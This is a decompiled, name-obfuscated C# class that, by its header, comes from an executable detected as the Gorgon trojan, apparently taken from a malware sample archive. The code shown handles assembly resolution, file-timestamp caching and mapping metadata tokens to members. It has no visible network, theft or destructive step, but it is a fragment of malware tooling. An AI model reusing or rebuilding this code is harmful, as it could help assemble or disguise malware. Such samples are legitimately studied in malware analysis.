// Decompiled with JetBrains decompiler
// Type: li9OdoS.6HFRYLK
// Assembly: gO77Fih, Version=16.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: F43F05C3-DF79-4EF2-8C94-619BF1ED6D3E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Gorgon.gen-83f6c309f411e1aebbdf75c62f67f163231f1b0ee065936230741272cda1cb9a.exe

using \u0039XQfkTy;
using c8S7IfO;
using cUJC88d;
using gvMbjW3;
using mHcl65S;
using NFHp96i;
using odRvpaC;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Reflection;
using TEpY6aq;
using ThTI8Bk;
using UCpTn82;
using zL2X6vG;

namespace li9OdoS
{
  internal static class \u0036HFRYLK
  {
    private static ConcurrentDictionary<string, long> \u00361LmK82 = new ConcurrentDictionary<string, long>((IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase);

    public static Lazy<Type> umkaDyw(Func<Assembly> a2mvpV2, int NDHYLa1)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      Wpvksmm.GIRNdzt girNdzt = new Wpvksmm.GIRNdzt();
      // ISSUE: reference to a compiler-generated field
      girNdzt.iVLd86j = a2mvpV2;
      // ISSUE: reference to a compiler-generated field
      ((\u0036HFRYLK.wfjA0wp) girNdzt).XvJR5TZ = NDHYLa1;
      // ISSUE: reference to a compiler-generated method
      return jo5n1dw.DR2z1ms<Type>(new Func<Type>(((\u0036HFRYLK.wfjA0wp) girNdzt).RYvMxaE));
    }

    public static Assembly sTIdWju(this IDictionary<string, object> GDFlDLR) => GDFlDLR.\u0034COODhq((Assembly) null);

    public static Assembly \u0034COODhq(
      this IDictionary<string, object> XIlfvT5,
      Assembly _param1)
    {
      return XIlfvT5.Cwy8xSQ("Assembly", _param1);
    }

    public static bool Cuy4qeV(this IDictionary<string, object> c83M7nB)
    {
      Q3QfRgO.CYK6tK8<IDictionary<string, object>>(c83M7nB);
      c83M7nB = c83M7nB.eguvZws<object>("Assembly");
      string bczWiS2_1 = c83M7nB.O2sGFwD<string>("Location");
      long num = c83M7nB.O2sGFwD<long>("TimeStamp");
      string bczWiS2_2 = c83M7nB.O2sGFwD<string>("ResolvedLocation");
      long IWnQOGA1 = c83M7nB.O2sGFwD<long>("ResolvedTimestamp");
      long IWnQOGA2 = num;
      if (!\u0036HFRYLK.OKvHsNX(bczWiS2_1, IWnQOGA2))
        return false;
      return bczWiS2_2 == null || \u0036HFRYLK.OKvHsNX(bczWiS2_2, IWnQOGA1);
    }

    public static bool OKvHsNX(string bczWiS2, long IWnQOGA) => \u0036HFRYLK.fe05rpM(bczWiS2) == IWnQOGA;

    public static long fe05rpM(string jkisWql) => \u0036HFRYLK.\u00361LmK82.GetOrAdd(jkisWql, (Func<string, long>) (sXs7TII => File.GetLastWriteTimeUtc(sXs7TII).Ticks));

    public static IDictionary<string, object> FpYE6em(
      string b80E3RK,
      string tn6KQIC,
      long _param2,
      int oP2GAIz,
      string GhyEPLQ,
      long DlGNKwT,
      IEnumerable<int> MQwu7Zi,
      IEnumerable<int> cy2S07B)
    {
      Q3QfRgO.oHJj1LF(b80E3RK);
      string path = b80E3RK;
      long timeStamp = _param2;
      int num = oP2GAIz;
      string str = tn6KQIC;
      string resolvedPath = GhyEPLQ;
      long resolvedTimestamp = DlGNKwT;
      int assemblyNameHash = num;
      string assemblyFullName = str;
      int[] array1 = MQwu7Zi.ToArray<int>();
      int[] array2 = cy2S07B.ToArray<int>();
      return new gzMilTR(-1L, path, timeStamp, resolvedPath, resolvedTimestamp, assemblyNameHash, assemblyFullName, array1, array2).nFxHzFe();
    }

    public static IDictionary<string, object> nFxHzFe(this gzMilTR Q7QpyLu) => (IDictionary<string, object>) new upeMz4J(new AV4Iptg(Q7QpyLu));

    internal static Func<MemberInfo[]> y8Nilzy(
      int?[] khuLxxV,
      IReadOnlyCollection<EDokEXf> _param1,
      Lazy<Type> DbCzG4l)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      \u0036HFRYLK.wRBBbRO wRbBbRo = new \u0036HFRYLK.wRBBbRO();
      // ISSUE: reference to a compiler-generated field
      wRbBbRo.IyPAncp = DbCzG4l;
      // ISSUE: reference to a compiler-generated field
      ((\u0036HFRYLK.hQU8MDf) wRbBbRo).\u00339Anq2L = khuLxxV;
      // ISSUE: reference to a compiler-generated field
      ((\u0036HFRYLK.hQU8MDf) wRbBbRo).\u0035eilDwf = _param1;
      // ISSUE: reference to a compiler-generated method
      return new Func<MemberInfo[]>(((\u0036HFRYLK.hQU8MDf) wRbBbRo).AxqQll7);
    }

    internal static int?[] \u0032Gq7BZC(
      MemberInfo[] gMdyxvT,
      Type kQTwI6u,
      out IReadOnlyCollection<EDokEXf> UBDh8G5)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      \u0036HFRYLK.FGzvzkJ fgzvzkJ = (\u0036HFRYLK.FGzvzkJ) new \u0036HFRYLK.hQU8MDf();
      // ISSUE: reference to a compiler-generated field
      ((\u0036HFRYLK.hQU8MDf) fgzvzkJ).\u0030X0o2QB = kQTwI6u;
      int?[] nullableArray = new int?[gMdyxvT.Length];
      List<EDokEXf> edokExfList = new List<EDokEXf>(gMdyxvT.Length);
      // ISSUE: reference to a compiler-generated method
      bool flag = ((IEnumerable<MemberInfo>) gMdyxvT).Where<MemberInfo>((Func<MemberInfo, bool>) (Eo25laQ => Eo25laQ != (MemberInfo) null)).All<MemberInfo>(new Func<MemberInfo, bool>(fgzvzkJ.sVbzKup));
      for (int index = 0; index < gMdyxvT.Length; ++index)
      {
        MemberInfo c0ijjE2 = gMdyxvT[index];
        if (!flag)
        {
          // ISSUE: reference to a compiler-generated field
          EDokEXf edokExf = \u0036HFRYLK.y8jQA1e(c0ijjE2, ((\u0036HFRYLK.hQU8MDf) fgzvzkJ).\u0030X0o2QB);
          edokExfList.Add(edokExf);
        }
        else
          nullableArray[index] = !(c0ijjE2 == (MemberInfo) null) ? new int?(gMdyxvT[index].MetadataToken) : new int?();
      }
      UBDh8G5 = (IReadOnlyCollection<EDokEXf>) edokExfList;
      return !flag ? (int?[]) null : nullableArray;
    }

    internal static EDokEXf y8jQA1e(MemberInfo c0ijjE2, Type Cxdq3O7)
    {
      EDokEXf edokExf = new EDokEXf();
      if (c0ijjE2 != (MemberInfo) null)
      {
        edokExf.CiajsSL = c0ijjE2.MetadataToken;
        if (!\u0036HFRYLK.ZMoZvfe(c0ijjE2, Cxdq3O7))
        {
          Type ZbizCqT = c0ijjE2.DeclaringType;
          if (ZbizCqT == (Type) null && c0ijjE2.MemberType == MemberTypes.TypeInfo)
            ZbizCqT = (Type) c0ijjE2;
          Q3QfRgO.CYK6tK8<Type>(ZbizCqT);
          edokExf.VudhqVM = new OWPM3BA()
          {
            YM5jH59 = ZbizCqT
          };
        }
      }
      return edokExf;
    }

    internal static Assembly XI0oj3P(this gzMilTR qzWFCbi)
    {
      Q3QfRgO.CYK6tK8<gzMilTR>(qzWFCbi);
      return dU74FFo.seVQTd4(qzWFCbi.\u0035qFUYCO, qzWFCbi.CoHpFeR);
    }

    internal static Lazy<ParameterInfo> MICFmX6(
      int _param0,
      EDokEXf VSqSG2v,
      Lazy<Type> mTTHAfn)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      \u0036HFRYLK.FGzvzkJ fgzvzkJ = new \u0036HFRYLK.FGzvzkJ();
      // ISSUE: reference to a compiler-generated field
      fgzvzkJ.\u0033HyZzcN = VSqSG2v;
      // ISSUE: reference to a compiler-generated field
      ((\u0036HFRYLK.ZzeKUWT) fgzvzkJ).VUUQ8aJ = mTTHAfn;
      // ISSUE: reference to a compiler-generated field
      ((\u0036HFRYLK.ZzeKUWT) fgzvzkJ).FXoAWo9 = _param0;
      // ISSUE: reference to a compiler-generated method
      return jo5n1dw.DR2z1ms<ParameterInfo>(new Func<ParameterInfo>(((\u0036HFRYLK.ZzeKUWT) fgzvzkJ).N3216bd));
    }

    private static Assembly Cwy8xSQ(
      this IDictionary<string, object> F9VVyD0,
      string rN5gBU9,
      Assembly bFQNwKr)
    {
      return F9VVyD0.RE2lbZI<Assembly>(new Func<IDictionary<string, object>, Assembly>(\u0036HFRYLK.\u0031jp3mgX), rN5gBU9, bFQNwKr);
    }

    private static Assembly \u0031jp3mgX(this IDictionary<string, object> Ygrv1kh)
    {
      Q3QfRgO.CYK6tK8<IDictionary<string, object>>(Ygrv1kh);
      return dU74FFo.seVQTd4(Ygrv1kh.O2sGFwD<string>("FullName"), Ygrv1kh.O2sGFwD<string>("Location"));
    }

    private static void r6oBvLg<T>(
      this IDictionary<string, object> K3HY92w,
      Action<IDictionary<string, object>, T> BvRZKSx,
      string _param2,
      T vV93K9Y)
    {
      K3HY92w.ljvLdnr<T>(BvRZKSx, _param2, vV93K9Y, default (T));
    }

    private static void ljvLdnr<T>(
      this IDictionary<string, object> B4GLOhN,
      Action<IDictionary<string, object>, T> mI18eOs,
      string jxbk1K6,
      T _param3,
      T OXbm9gX)
    {
      if (object.Equals((object) _param3, (object) OXbm9gX))
        return;
      Dictionary<string, object> InvjlMe = new Dictionary<string, object>();
      mI18eOs((IDictionary<string, object>) InvjlMe, _param3);
      B4GLOhN.AsybGbn<object>(jxbk1K6, (IDictionary<string, object>) InvjlMe);
    }

    private static T \u0036Qb1nvQ<T>(
      this IDictionary<string, object> TcTNVsG,
      Func<IDictionary<string, object>, T> PIQNISc,
      string cAhyfu1)
    {
      return TcTNVsG.RE2lbZI<T>(PIQNISc, cAhyfu1, default (T));
    }

    private static T RE2lbZI<T>(
      this IDictionary<string, object> wUToOP3,
      Func<IDictionary<string, object>, T> nya1mtC,
      string E31jT0M,
      T f2FWRce)
    {
      IDictionary<string, object> dictionary = wUToOP3.eguvZws<object>(E31jT0M);
      return dictionary.Count != 0 ? nya1mtC(dictionary) : f2FWRce;
    }

    private static bool ZMoZvfe(MemberInfo lHY4I6B, Type eh1GYim)
    {
      if (!(eh1GYim != (Type) null) || !(eh1GYim.Assembly == lHY4I6B.Module.Assembly) || !(lHY4I6B.Module == lHY4I6B.Module.Assembly.ManifestModule))
        return false;
      return lHY4I6B.DeclaringType == (Type) null || !lHY4I6B.DeclaringType.IsGenericType;
    }

    private static MemberInfo \u00360QXLNj(EDokEXf _param0, Type jeEgFzn) => _param0.CiajsSL == 0 ? (MemberInfo) null : (_param0.VudhqVM != null ? \u0036HFRYLK.p7QWGm4(dU74FFo.ACCWpaX(_param0.VudhqVM.YM5jH59.Module, _param0.CiajsSL), _param0.VudhqVM.YM5jH59) : dU74FFo.ACCWpaX(jeEgFzn.Assembly.ManifestModule, _param0.CiajsSL));

    private static MemberInfo p7QWGm4(MemberInfo _param0, Type dlZia7E)
    {
      switch (_param0.MemberType)
      {
        case MemberTypes.Constructor:
          return (MemberInfo) MethodBase.GetMethodFromHandle(((MethodBase) _param0).MethodHandle, dlZia7E.TypeHandle);
        case MemberTypes.Field:
          return (MemberInfo) FieldInfo.GetFieldFromHandle(((FieldInfo) _param0).FieldHandle, dlZia7E.TypeHandle);
        case MemberTypes.Method:
        case MemberTypes.Property:
          return (MemberInfo) MethodBase.GetMethodFromHandle(((MethodBase) _param0).MethodHandle, dlZia7E.TypeHandle);
        case MemberTypes.TypeInfo:
          return (MemberInfo) dlZia7E;
        case MemberTypes.NestedType:
          return _param0;
        default:
          Q3QfRgO.alqssdE(string.Format((IFormatProvider) CultureInfo.CurrentCulture, eeRvc28.eiTCRJ1, (object) _param0.MemberType.ToString()));
          return (MemberInfo) null;
      }
    }
  }
}
